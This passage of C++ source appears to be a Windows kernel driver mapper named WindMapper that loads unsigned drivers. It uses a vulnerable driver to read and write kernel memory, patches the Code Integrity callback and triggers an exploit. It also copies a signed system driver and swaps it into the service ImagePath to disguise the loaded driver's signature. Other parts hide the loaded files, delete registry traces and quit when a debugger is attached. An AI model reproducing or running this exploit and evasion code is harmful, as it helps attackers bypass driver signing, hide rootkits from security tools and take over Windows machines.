            status = Utils::GetFullPath(sentinelPath, sentinelFullPath, sizeof(sentinelFullPath));
            LOG_STATUS("GetFullPath (sentinel)", status);
            if (!NT_SUCCESS(status)) {
                return status;
            }
            LOG("Sentinel full path: %ls", sentinelFullPath);
            status = DriverLoader::CreateDriverService(g_SentinelServicePath, sentinelFullPath);
            LOG_STATUS("CreateDriverService (sentinel)", status);
            LOG("Sentinel service path: %ls elapsed_ms=%llu", g_SentinelServicePath, MapperElapsedMs(windStartTick));
            if (!NT_SUCCESS(status)) {
                return status;
            }
        }

        WCHAR shadowFsFullPath[520] = {};
        if (shadowFsPath && shadowFsPath[0]) {
            status = Utils::GetFullPath(shadowFsPath, shadowFsFullPath, sizeof(shadowFsFullPath));
            LOG_STATUS("GetFullPath (shadowfs)", status);
            if (!NT_SUCCESS(status)) {
                return status;
            }
            LOG("ShadowFS full path: %ls", shadowFsFullPath);
            status = DriverLoader::CreateMinifilterService(
                g_ShadowFsServicePath,
                shadowFsFullPath,
                L"AiDAShadowFS Instance",
                L"385701");
            LOG_STATUS("CreateMinifilterService (shadowfs)", status);
            LOG("ShadowFS service path: %ls elapsed_ms=%llu", g_ShadowFsServicePath, MapperElapsedMs(windStartTick));
            if (!NT_SUCCESS(status)) {
                return status;
            }
        }

        WCHAR donorPath[MAX_PATH] = {};
        BOOL donorIsEV = FALSE;
        BOOL donorFound = FALSE;
        WCHAR donorCopyPath[520] = {};

        {


            WCHAR driversDir[MAX_PATH];
            GetSystemDirectoryW(driversDir, MAX_PATH);
            wcscat_s(driversDir, L"\\drivers");

            WIN32_FIND_DATAW fd;
            WCHAR searchPat[MAX_PATH];
            wcscpy_s(searchPat, driversDir);
            wcscat_s(searchPat, L"\\*.sys");
            HANDLE hFind = FindFirstFileW(searchPat, &fd);
            int bestScore = 0;
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                    if (fd.nFileSizeLow < 8192) continue;
                    WCHAR fullPath[MAX_PATH];
                    wcscpy_s(fullPath, driversDir);
                    wcscat_s(fullPath, L"\\");
                    wcscat_s(fullPath, fd.cFileName);


                    HANDLE hf = CreateFileW(fullPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
                    if (hf == INVALID_HANDLE_VALUE) continue;
                    BYTE hdr[4096];
                    DWORD br = 0;
                    BOOL readOk = ReadFile(hf, hdr, sizeof(hdr), &br, nullptr);
                    CloseHandle(hf);
                    if (!readOk || br < 512) continue;

                    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hdr;
                    if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
                    if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > br) continue;
                    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(hdr + dos->e_lfanew);
                    if (nt->Signature != IMAGE_NT_SIGNATURE) continue;
                    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) continue;
                    PIMAGE_NT_HEADERS64 nt64 = (PIMAGE_NT_HEADERS64)nt;
                    if (nt64->OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_SECURITY) continue;
                    if (nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress == 0) continue;
                    if (nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size < 128) continue;


                    WINTRUST_FILE_INFO wfi = {};
                    wfi.cbStruct = sizeof(wfi);
                    wfi.pcwszFilePath = fullPath;
                    GUID actionGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;
                    WINTRUST_DATA wtd = {};
                    wtd.cbStruct = sizeof(wtd);
                    wtd.dwUIChoice = WTD_UI_NONE;
                    wtd.fdwRevocationChecks = WTD_REVOKE_NONE;
                    wtd.dwUnionChoice = WTD_CHOICE_FILE;
                    wtd.pFile = &wfi;
                    wtd.dwStateAction = WTD_STATEACTION_VERIFY;
                    wtd.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;
                    LONG lStatus = WinVerifyTrust(NULL, &actionGUID, &wtd);
                    wtd.dwStateAction = WTD_STATEACTION_CLOSE;
                    WinVerifyTrust(NULL, &actionGUID, &wtd);

                    int score = (lStatus == ERROR_SUCCESS) ? 100 : 0;
                    if (score > bestScore) {
                        bestScore = score;
                        wcscpy_s(donorPath, fullPath);
                    }
                    if (bestScore >= 100) break;
                } while (FindNextFileW(hFind, &fd));
                FindClose(hFind);
            }
            donorFound = (bestScore > 0);
        }

        if (donorFound && donorPath[0]) {
            PCWSTR targetDir = driverFullPath;
            PCWSTR lastSlash = wcsrchr(driverFullPath, L'\\');
            WCHAR targetDirBuf[520] = {};
            if (lastSlash) {
                wcsncpy_s(targetDirBuf, driverFullPath, lastSlash - driverFullPath + 1);
            } else {
                wcscpy_s(targetDirBuf, L".\\");
            }
            std::wstring donorCopyName = Utils::GenerateRandomName(10) + L".sys";
            wcscpy_s(donorCopyPath, targetDirBuf);
            wcscat_s(donorCopyPath, donorCopyName.c_str());
            if (!CopyFileW(donorPath, donorCopyPath, FALSE)) {
                donorFound = FALSE;
            } else {

                SetFileAttributesW(donorCopyPath, FILE_ATTRIBUTE_HIDDEN);
                MoveFileExW(donorCopyPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
                wcscpy_s(g_DonorCopyPath, donorCopyPath);
            }
        }

        PCWSTR targetFileName = wcsrchr(driverFullPath, L'\\');
        if (targetFileName) targetFileName++;
        else targetFileName = driverFullPath;


        PCWSTR sentinelFileName = nullptr;
        if (sentinelFullPath[0]) {
            sentinelFileName = wcsrchr(sentinelFullPath, L'\\');
            if (sentinelFileName) sentinelFileName++;
            else sentinelFileName = sentinelFullPath;
        }

        PCWSTR shadowFsFileName = nullptr;
        if (shadowFsFullPath[0]) {
            shadowFsFileName = wcsrchr(shadowFsFullPath, L'\\');
            if (shadowFsFileName) shadowFsFileName++;
            else shadowFsFileName = shadowFsFullPath;
        }

        LOG("Calling TriggerExploit...");
        status = TriggerExploit(targetFileName, sentinelFileName, shadowFsFileName,
                                driverFullPath, sentinelFullPath, shadowFsFullPath,
                                loaderFullPath);
        LOG_STATUS("TriggerExploit", status);
        LOG("TriggerExploit returned status=0x%08X elapsed_ms=%llu target_file=%ls sentinel_file=%ls shadowfs_file=%ls",
            static_cast<DWORD>(status),
            static_cast<unsigned long long>(GetTickCount64() - windStartTick),
            targetFileName ? targetFileName : L"(null)",
            sentinelFileName ? sentinelFileName : L"(null)",
            shadowFsFileName ? shadowFsFileName : L"(null)");
        if (g_LastTriggerDeferredSentinelLiveQueries) {
            LOG("wind_after_trigger snapshot skipped build=%lu reason=verified_file_preseed_no_live_query status=0x%08X target_base=%p",
                MapperBuildNumber(),
                static_cast<DWORD>(status),
                g_DriverLoadAddress);
        } else {
            LogKernelModuleSnapshot("wind_after_trigger", targetFileName, sentinelFileName, shadowFsFileName);
        }
        if (NT_SUCCESS(status)) {
            LOG("Hiding loaded driver file: %ls", driverFullPath);
            const ULONGLONG finalTargetHideStart = GetTickCount64();
            if (Utils::HideLoadedImagePath(driverFullPath)) {
                LOG("Driver file hidden/renamed OK elapsed_ms=%llu total_elapsed_ms=%llu",
                    MapperElapsedMs(finalTargetHideStart),
                    MapperElapsedMs(windStartTick));
            } else {
                LOG("WARNING: Failed to hide loaded driver file gle=%lu elapsed_ms=%llu total_elapsed_ms=%llu",
                    GetLastError(),
                    MapperElapsedMs(finalTargetHideStart),
                    MapperElapsedMs(windStartTick));
            }

            if (sentinelFullPath[0]) {
                const ULONGLONG finalSentinelHideStart = GetTickCount64();
                if (Utils::HideLoadedImagePath(sentinelFullPath)) {
                    LOG("Sentinel final hide OK path=%ls elapsed_ms=%llu total_elapsed_ms=%llu",
                        sentinelFullPath,
                        MapperElapsedMs(finalSentinelHideStart),
                        MapperElapsedMs(windStartTick));
                } else {
                    LOG("Sentinel final hide failed path=%ls gle=%lu elapsed_ms=%llu total_elapsed_ms=%llu",
                        sentinelFullPath,
                        GetLastError(),
                        MapperElapsedMs(finalSentinelHideStart),
                        MapperElapsedMs(windStartTick));
                }
            }

            if (shadowFsFullPath[0]) {
                const ULONGLONG finalShadowHideStart = GetTickCount64();
                if (Utils::HideLoadedImagePath(shadowFsFullPath)) {
                    LOG("ShadowFS final hide OK path=%ls elapsed_ms=%llu total_elapsed_ms=%llu",
                        shadowFsFullPath,
                        MapperElapsedMs(finalShadowHideStart),
                        MapperElapsedMs(windStartTick));
                } else {
                    LOG("ShadowFS final hide failed path=%ls gle=%lu elapsed_ms=%llu total_elapsed_ms=%llu",
                        shadowFsFullPath,
                        GetLastError(),
                        MapperElapsedMs(finalShadowHideStart),
                        MapperElapsedMs(windStartTick));
                }
            }
        }


        if (NT_SUCCESS(status) && donorFound && donorCopyPath[0] && RtlWriteRegistryValuePtr) {

            WCHAR ntDonorPath[520] = {};
            wcscpy_s(ntDonorPath, L"\\??\\");
            wcscat_s(ntDonorPath, donorCopyPath);
            SIZE_T ntDonorLen = wcslen(ntDonorPath);

            NTSTATUS regStatus = RtlWriteRegistryValuePtr(
                0, g_DriverServicePath, L"ImagePath", REG_SZ,
                ntDonorPath, static_cast<ULONG>((ntDonorLen + 1) * sizeof(WCHAR)));

            if (NT_SUCCESS(regStatus)) {
                LOG("Donor ImagePath replacement OK donor=%ls service=%ls elapsed_ms=%llu",
                    ntDonorPath,
                    g_DriverServicePath,
                    MapperElapsedMs(windStartTick));
            } else {
                LOG("Donor ImagePath replacement failed status=0x%08X donor=%ls service=%ls elapsed_ms=%llu",
                    (DWORD)regStatus,
                    ntDonorPath,
                    g_DriverServicePath,
                    MapperElapsedMs(windStartTick));
            }
        }

        LOG("=== WindLoadDriver END status=0x%08X elapsed_ms=%llu target_base=%p sentinel_base=%p sentinel_size=0x%X ===",
            (DWORD)status,
            MapperElapsedMs(windStartTick),
            g_DriverLoadAddress,
            g_SentinelLoadAddress,
            g_SentinelImageSize);
        return status;
    }

    BOOL WriteSentinelGlobals(HANDLE device, PVOID sentinelBase, ULONG sentinelImageSize,
                              PVOID whoswhoBase, ULONG whoswhoSize) {
        LOG("=== WriteSentinelGlobals ===");
        LOG("sentinelBase=%p, sentinelImageSize=0x%X", sentinelBase, sentinelImageSize);
        LOG("whoswhoBase=%p, whoswhoSize=0x%X", whoswhoBase, whoswhoSize);

        IMAGE_DOS_HEADER dosHeader = {};
        NTSTATUS status = VulnDriver::ReadKernelMemory(device, sentinelBase, &dosHeader, sizeof(dosHeader));
        LOG_STATUS("ReadKernelMemory (DOS header)", status);
        if (!NT_SUCCESS(status) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
            LOG("ERROR: Invalid DOS header, e_magic=0x%04X", dosHeader.e_magic);
            return FALSE;
        }
        LOG("DOS header OK, e_lfanew=0x%X", dosHeader.e_lfanew);


        PVOID ntHeaderAddr = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(sentinelBase) + dosHeader.e_lfanew);
        LOG("NT headers addr: %p", ntHeaderAddr);

        IMAGE_NT_HEADERS64 ntHeaders = {};
        status = VulnDriver::ReadKernelMemory(device, ntHeaderAddr, &ntHeaders, sizeof(ntHeaders));
        LOG_STATUS("ReadKernelMemory (NT headers)", status);
        if (!NT_SUCCESS(status) || ntHeaders.Signature != IMAGE_NT_SIGNATURE ||
            ntHeaders.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
            LOG("ERROR: Invalid NT headers, Signature=0x%X OptionalMagic=0x%X", ntHeaders.Signature, ntHeaders.OptionalHeader.Magic);
            return FALSE;
        }
        ULONG effectiveSentinelImageSize = sentinelImageSize;
        if (effectiveSentinelImageSize == 0) {
            effectiveSentinelImageSize = ntHeaders.OptionalHeader.SizeOfImage;
        }
        if (effectiveSentinelImageSize == 0 || effectiveSentinelImageSize > 100 * 1024 * 1024) {
            LOG("ERROR: Invalid Sentinel image size supplied=0x%X optional=0x%X", sentinelImageSize, ntHeaders.OptionalHeader.SizeOfImage);
            return FALSE;
        }
        LOG("NT headers OK, %d sections, SizeOfOptionalHeader=0x%X",
            ntHeaders.FileHeader.NumberOfSections, ntHeaders.FileHeader.SizeOfOptionalHeader);


        ULONG_PTR sectionTableAddr =
            reinterpret_cast<ULONG_PTR>(ntHeaderAddr) +
            offsetof(IMAGE_NT_HEADERS64, OptionalHeader) +
            ntHeaders.FileHeader.SizeOfOptionalHeader;

        WORD numSections = ntHeaders.FileHeader.NumberOfSections;
        if (numSections > 64) numSections = 64;
        LOG("Reading %d section headers from %p...", numSections, (PVOID)sectionTableAddr);

        IMAGE_SECTION_HEADER sections[64] = {};
        status = VulnDriver::ReadKernelMemory(
            device,
            reinterpret_cast<PVOID>(sectionTableAddr),
            sections,
            numSections * sizeof(IMAGE_SECTION_HEADER));
        LOG_STATUS("ReadKernelMemory (section headers)", status);

        if (!NT_SUCCESS(status)) {
            return FALSE;
        }

        for (WORD i = 0; i < numSections; i++) {
            char secName[9] = {};
            memcpy(secName, sections[i].Name, 8);
            LOG("  Section[%d]: '%s' VA=0x%X VSize=0x%X RawSize=0x%X",
                i, secName, sections[i].VirtualAddress, sections[i].Misc.VirtualSize, sections[i].SizeOfRawData);
        }


        PVOID sntlKernelAddr = nullptr;
        ULONG sntlSize = 0;
        ULONG sntlRva = 0;
        for (WORD i = 0; i < numSections; i++) {
            if (memcmp(sections[i].Name, ".sntl\0\0\0", 8) == 0) {
                sntlRva = sections[i].VirtualAddress;
                sntlKernelAddr = reinterpret_cast<PVOID>(
                    reinterpret_cast<ULONG_PTR>(sentinelBase) + sntlRva);
                sntlSize = sections[i].Misc.VirtualSize;
                if (sntlSize < sections[i].SizeOfRawData) {
                    sntlSize = sections[i].SizeOfRawData;
                }
                LOG("Found .sntl section at kernel addr %p, rva=0x%X size=0x%X", sntlKernelAddr, sntlRva, sntlSize);
                break;
            }
        }

        if (!sntlKernelAddr) {
            LOG("ERROR: .sntl section not found in Sentinel driver!");
            return FALSE;
        }

        if (sntlSize < sizeof(aida_sentinel_handoff_block)) {
            LOG("ERROR: .sntl section too small (0x%X < 0x%X)", sntlSize, static_cast<unsigned>(sizeof(aida_sentinel_handoff_block)));
            return FALSE;
        }

        if (sntlRva > effectiveSentinelImageSize || sntlSize > effectiveSentinelImageSize - sntlRva) {
            LOG("ERROR: .sntl section outside Sentinel image rva=0x%X size=0x%X image_size=0x%X", sntlRva, sntlSize, effectiveSentinelImageSize);
            return FALSE;
        }


        if (whoswhoSize == 0) {
            LOG("ERROR: WhosWho size is zero");
            return FALSE;
        }

        aida_sentinel_handoff_block handoff = {};
        aida_sentinel_handoff_prepare(&handoff, whoswhoBase, nullptr, whoswhoSize);
        const ULONGLONG handoffWriteStart = GetTickCount64();
        status = VulnDriver::WriteKernelMemory(device, sntlKernelAddr, &handoff, sizeof(handoff));
        LOG_STATUS("WriteKernelMemory (.sntl handoff block)", status);
        aida_sentinel_handoff_block verifyBlock = {};
        NTSTATUS verifyStatus = VulnDriver::ReadKernelMemory(device, sntlKernelAddr, &verifyBlock, sizeof(verifyBlock));
        LOG_STATUS("ReadKernelMemory (.sntl handoff verify)", verifyStatus);
        PVOID verifyBase = reinterpret_cast<PVOID>(static_cast<ULONG_PTR>(verifyBlock.target_base));
        PVOID verifyObject = reinterpret_cast<PVOID>(static_cast<ULONG_PTR>(verifyBlock.target_object));
        BOOL validBlock = aida_sentinel_handoff_valid(&verifyBlock);
        BOOL match = validBlock && verifyBase == whoswhoBase && verifyObject == nullptr && verifyBlock.target_size == whoswhoSize;
        LOG("WriteSentinelGlobals handoff_verify write_status=0x%08X verify_status=0x%08X slot=%p magic=0x%08X version=%u block_size=0x%X checksum=0x%08X valid=%u base=%p expected_base=%p object=%p size=0x%X expected_size=0x%X match=%u elapsed_ms=%llu",
            static_cast<DWORD>(status),
            static_cast<DWORD>(verifyStatus),
            sntlKernelAddr,
            verifyBlock.magic,
            verifyBlock.version,
            verifyBlock.size,
            verifyBlock.checksum,
            validBlock ? 1u : 0u,
            verifyBase,
            whoswhoBase,
            verifyObject,
            verifyBlock.target_size,
            whoswhoSize,
            match ? 1u : 0u,
            MapperElapsedMs(handoffWriteStart));
        if (!NT_SUCCESS(status) || !NT_SUCCESS(verifyStatus) || !match) {
            return FALSE;
        }

        LOG("WriteSentinelGlobals completed successfully");
        return TRUE;
    }

    NTSTATUS RestoreCiCallback(HANDLE device) {
        NTSTATUS status = STATUS_SUCCESS;


        if (g_CiCallbackPatched && g_CiCallbackAddress && g_OriginalCiCallback) {
            AntiDetect::TimingJitter();
            ULONGLONG ciPhysical = VulnDriver::VirtualToPhysical(device, g_CiCallbackAddress);
            LOG("RestoreCiCallback physical slot addr=%p phys=0x%llX original=%p",
                g_CiCallbackAddress,
                static_cast<unsigned long long>(ciPhysical),
                g_OriginalCiCallback);
            PVOID previousCallback = nullptr;
            status = ciPhysical != 0
                ? VulnDriver::ExchangePhysicalPointer(device, ciPhysical, g_OriginalCiCallback, &previousCallback)
                : STATUS_UNSUCCESSFUL;
            LOG("RestoreCiCallback exchange status=0x%08X previous=%p original=%p match_current_patch=%u",
                static_cast<DWORD>(status),
                previousCallback,
                g_OriginalCiCallback,
                previousCallback != nullptr && previousCallback != g_OriginalCiCallback ? 1u : 0u);
            if (NT_SUCCESS(status)) {
                g_CiCallbackPatched = false;
                AntiDetect::MemoryBarrier();
            }
        }

        return status;
    }

    NTSTATUS CleanupArtifacts() {
        auto deleteRegistryTree = [](PCWSTR registryPath) -> NTSTATUS {
            if (!registryPath || wcslen(registryPath) < 10) {
                return STATUS_INVALID_PARAMETER;
            }

            if (NtDeleteKeyPtr && NtOpenKeyPtr) {
                UNICODE_STRING keyName;
                RtlInitUnicodeString(&keyName, registryPath);

                OBJECT_ATTRIBUTES objAttr;
                InitializeObjectAttributes(&objAttr, &keyName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

                HANDLE hKey = nullptr;
                NTSTATUS st = NtOpenKeyPtr(&hKey, DELETE | KEY_ENUMERATE_SUB_KEYS, &objAttr);
                if (NT_SUCCESS(st)) {
                    WCHAR subKeyPath[512];
                    const WCHAR* subKeys[] = { L"\\Enum", L"\\Security", L"\\Parameters" };
                    for (int i = 0; i < 3; i++) {
                        wcscpy_s(subKeyPath, registryPath);
                        wcscat_s(subKeyPath, subKeys[i]);

                        UNICODE_STRING subName;
                        RtlInitUnicodeString(&subName, subKeyPath);

                        OBJECT_ATTRIBUTES subAttr;
                        InitializeObjectAttributes(&subAttr, &subName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

                        HANDLE hSubKey = nullptr;
                        NTSTATUS subSt = NtOpenKeyPtr(&hSubKey, DELETE, &subAttr);
                        if (NT_SUCCESS(subSt)) {
                            NtDeleteKeyPtr(hSubKey);
                            NtClose(hSubKey);
                        }
                    }

                    if (NtFlushKeyPtr) {
                        NtFlushKeyPtr(hKey);
                    }
                    NtDeleteKeyPtr(hKey);
                    NtClose(hKey);
                    return STATUS_SUCCESS;
                }
            }

            WCHAR regPath[256];
            if (wcslen(registryPath) > 18) {
                wcscpy_s(regPath, registryPath + 18);
                SHDeleteKeyW(HKEY_LOCAL_MACHINE, regPath);
            }

            return STATUS_SUCCESS;
        };

        if (wcslen(g_LoaderServicePath) > 0) {
            deleteRegistryTree(g_LoaderServicePath);
        }


        if (wcslen(g_DriverServicePath) > 0 && g_DonorCopyPath[0] == L'\0') {
            deleteRegistryTree(g_DriverServicePath);
        }


        if (wcslen(g_SentinelServicePath) > 0) {
            deleteRegistryTree(g_SentinelServicePath);
        }

        if (wcslen(g_ShadowFsServicePath) > 0) {
            deleteRegistryTree(g_ShadowFsServicePath);
        }

        return STATUS_SUCCESS;
    }

}

static void RunSignatureCheck(LPCWSTR filePath) {
    if (g_KernelSigningVerified) {
    } else {
        if (g_DriverLoadAddress) {
        }
    }


    LPCWSTR checkPath = filePath;
    BOOL isStomped = FALSE;
    if (g_DonorCopyPath[0] != L'\0') {
        checkPath = g_DonorCopyPath;
        isStomped = TRUE;
    }

    if (isStomped) {
    }

    WINTRUST_FILE_INFO fileInfo = {};
    fileInfo.cbStruct = sizeof(WINTRUST_FILE_INFO);
    fileInfo.pcwszFilePath = checkPath;

    GUID actionGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;

    WINTRUST_DATA trustData = {};
    trustData.cbStruct = sizeof(WINTRUST_DATA);
    trustData.dwUIChoice = WTD_UI_NONE;
    trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
    trustData.dwUnionChoice = WTD_CHOICE_FILE;
    trustData.pFile = &fileInfo;
    trustData.dwStateAction = WTD_STATEACTION_VERIFY;
    trustData.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;

    LONG lStatus = WinVerifyTrust(NULL, &actionGUID, &trustData);

    BOOL isEV = FALSE;
    char signerNameA[256] = {};
    BOOL hasCert = FALSE;
    BOOL hasTimestamp = FALSE;

    if (trustData.hWVTStateData) {
        CRYPT_PROVIDER_DATA* prov = WTHelperProvDataFromStateData(trustData.hWVTStateData);
        if (prov) {
            CRYPT_PROVIDER_SGNR* sgnr = WTHelperGetProvSignerFromChain(prov, 0, FALSE, 0);
            if (sgnr) {
                hasTimestamp = (sgnr->csCounterSigners > 0);
                if (sgnr->pChainContext && sgnr->pChainContext->cChain > 0) {
                    hasCert = TRUE;
                    CERT_SIMPLE_CHAIN* chain = sgnr->pChainContext->rgpChain[0];
                    if (chain->cElement > 0) {
                        PCCERT_CONTEXT leafCert = chain->rgpElement[0]->pCertContext;
                        CertGetNameStringA(leafCert, CERT_NAME_SIMPLE_DISPLAY_TYPE, 0,
                            NULL, signerNameA, sizeof(signerNameA));

                        static const char* evOIDs[] = {
                            "2.23.140.1.1",
                            "2.23.140.1.3",
                            "2.23.140.1.4.1",
                            "1.3.6.1.4.1.311.94.1.1",
                            "2.16.840.1.114414.1.7.23.3",
                            "2.16.840.1.113733.1.7.23.6",
                            "2.16.840.1.113733.1.7.48.1",
                            "1.3.6.1.4.1.6449.2.1.1",
                            "1.3.6.1.4.1.6449.1.2.1.5.1",
                            "1.3.6.1.4.1.44947.1.1.1",
                            "2.16.840.1.114028.10.1.2",
                            "1.3.6.1.4.1.14370.1.6",
                            "1.3.6.1.4.1.4788.2.202.1",
                            "2.16.840.1.114413.1.7.23.3",
                            "1.3.6.1.4.1.8024.0.2.100.1.2",
                            "2.16.756.1.89.1.2.1.1",
                            "2.16.840.1.114412.2.1",
                            "2.16.840.1.114412.3.2",
                            "1.3.6.1.4.1.4146.1.1",
                            "1.2.616.1.113527.2.5.1.1",
                            "1.3.171.1.1.10.5.2",
                            "1.3.6.1.4.1.34697.2.1",
                            "1.3.6.1.4.1.40869.1.1.22.3",
                            "2.16.840.1.114171.500.9",
                            "2.16.578.1.26.1.3.3",
                            "1.3.6.1.4.1.17326.10.14.2.1.2",
                            "1.3.6.1.4.1.22234.2.5.2.3.1",
                            "2.16.840.1.114404.1.1.2.4.1",
                            "1.3.6.1.4.1.23223.1.1.1",
                        };

                        for (DWORD e = 0; e < chain->cElement && !isEV; e++) {
                            PCCERT_CONTEXT cert = chain->rgpElement[e]->pCertContext;
                            PCERT_EXTENSION pExt = CertFindExtension(
                                szOID_CERT_POLICIES,
                                cert->pCertInfo->cExtension,
                                cert->pCertInfo->rgExtension);
                            if (pExt) {
                                CERT_POLICIES_INFO* polInfo = nullptr;
                                DWORD cbDecoded = 0;
                                if (CryptDecodeObjectEx(
                                    X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
                                    X509_CERT_POLICIES,
                                    pExt->Value.pbData,
                                    pExt->Value.cbData,
                                    CRYPT_DECODE_ALLOC_FLAG,
                                    nullptr,
                                    &polInfo,
                                    &cbDecoded) && polInfo) {
                                    for (DWORD p = 0; p < polInfo->cPolicyInfo && !isEV; p++) {
                                        for (int oid = 0; oid < sizeof(evOIDs) / sizeof(evOIDs[0]); oid++) {
                                            if (strcmp(polInfo->rgPolicyInfo[p].pszPolicyIdentifier, evOIDs[oid]) == 0) {
                                                isEV = TRUE;
                                                break;
                                            }
                                        }
                                    }
                                    LocalFree(polInfo);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    if (hasCert) {
        if (isStomped) {
        } else {
        }
        if (hasTimestamp)
        if (lStatus == ERROR_SUCCESS) {
        } else {
        }

        if (signerNameA[0]) {
            MultiByteToWideChar(CP_ACP, 0, signerNameA, -1, g_DonorSignerName, 256);
        }
    } else {
    }

    trustData.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(NULL, &actionGUID, &trustData);

    if (g_KernelSigningVerified) {
    }
    if (hasCert && isStomped) {
        if (lStatus == ERROR_SUCCESS) {
        }
    } else if (hasCert) {
    }
}

int main(int argc, char* argv[]) {
    // Open log file immediately
    OpenMapperLog();
    LOG("============================================");
    LOG("WindMapper started, argc=%d", argc);
    LOG("WindMapper process context pid=%lu tid=%lu build=%lu tick=%llu log_file_present=%u",
        GetCurrentProcessId(),
        GetCurrentThreadId(),
        MapperBuildNumber(),
        static_cast<unsigned long long>(GetTickCount64()),
        g_LogFile ? 1u : 0u);
    for (int i = 0; i < argc; i++) {
        LOG("  argv[%d] = '%s'", i, argv[i]);
    }

    // Log OS version
    {
        typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (ntdll) {
            RtlGetVersionPtr fn = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
            if (fn) {
                RTL_OSVERSIONINFOW osvi = { sizeof(osvi) };
                if (fn(&osvi) == 0) {
                    LOG("OS: Windows %u.%u Build %u (isWin11=%s)",
                        osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber,
                        osvi.dwBuildNumber >= 22000 ? "YES" : "NO");
                }
            }
        }
    }

#ifndef _DEBUG
    if (AntiDetect::IsBeingDebugged()) {
        LOG("Debugger detected, exiting.");
        if (g_LogFile) fclose(g_LogFile);
        return 1;
    }
#endif

    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        TOKEN_PRIVILEGES tp;
        LUID luid;
        if (LookupPrivilegeValue(NULL, SE_LOAD_DRIVER_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
                LOG("FATAL: AdjustTokenPrivileges failed, GLE=%u", GetLastError());
                CloseHandle(hToken);
                if (g_LogFile) fclose(g_LogFile);
                return 1;
            }
            LOG("SeLoadDriverPrivilege acquired via token adjustment");
        } else {
            LOG("WARNING: LookupPrivilegeValue failed, GLE=%u", GetLastError());
        }
        CloseHandle(hToken);
    } else {
        LOG("WARNING: OpenProcessToken failed, GLE=%u", GetLastError());
    }

    if (argc < 2) {
        LOG("FATAL: argc < 2 - missing driver argument");
        if (g_LogFile) fclose(g_LogFile);
        return 1;
    }

    LOG("InitializeNtFunctions_begin");
    if (!Utils::InitializeNtFunctions()) {
        LOG("FATAL: InitializeNtFunctions failed");
        if (g_LogFile) fclose(g_LogFile);
        return 1;
    }
    LOG("InitializeNtFunctions_ok");

    LOG("Initializing embedded driver data...");
    if (!InitializeDriverData()) {
        LOG("FATAL: InitializeDriverData failed");
        if (g_LogFile) fclose(g_LogFile);
        return 1;
    }
    LOG("Embedded driver: size=%zu bytes", g_P2CDriverSize);

    std::wstring driverArg;
    {
        size_t argLen = strlen(argv[1]);
        int wideLen = MultiByteToWideChar(CP_ACP, 0, argv[1], -1, nullptr, 0);
        if (wideLen <= 0) {
            LOG("FATAL: MultiByteToWideChar failed for driver arg");
            ReleaseDriverData();
            if (g_LogFile) fclose(g_LogFile);
            return 1;
        }
        driverArg.resize(static_cast<size_t>(wideLen));
        MultiByteToWideChar(CP_ACP, 0, argv[1], -1, &driverArg[0], wideLen);
        driverArg.resize(wcslen(driverArg.c_str()));
    }
    LOG("Driver arg: %ls", driverArg.c_str());

    std::wstring sentinelArg;
    if (argc >= 3) {
        int wideLen = MultiByteToWideChar(CP_ACP, 0, argv[2], -1, nullptr, 0);
        if (wideLen > 0) {
            sentinelArg.resize(static_cast<size_t>(wideLen));
            MultiByteToWideChar(CP_ACP, 0, argv[2], -1, &sentinelArg[0], wideLen);
            sentinelArg.resize(wcslen(sentinelArg.c_str()));
        }
    }
    LOG("Sentinel arg: %ls", sentinelArg.empty() ? L"(none)" : sentinelArg.c_str());

    std::wstring shadowFsArg;
    if (argc >= 4) {
        int wideLen = MultiByteToWideChar(CP_ACP, 0, argv[3], -1, nullptr, 0);
        if (wideLen > 0) {
            shadowFsArg.resize(static_cast<size_t>(wideLen));
            MultiByteToWideChar(CP_ACP, 0, argv[3], -1, &shadowFsArg[0], wideLen);
            shadowFsArg.resize(wcslen(shadowFsArg.c_str()));
        }
    }
    LOG("ShadowFS arg: %ls", shadowFsArg.empty() ? L"(none)" : shadowFsArg.c_str());

    if (g_P2CDriverSize == 0) {
        LOG("FATAL: g_P2CDriverSize == 0 after init");
        ReleaseDriverData();
        if (g_LogFile) fclose(g_LogFile);
        return 1;
    }
    std::wstring loaderFilePath = Utils::GetTempFilePath(L".sys");
    std::wstring driverFilePath = Utils::GetTempFilePath(L".sys");
    LOG("Loader temp path: %ls", loaderFilePath.c_str());
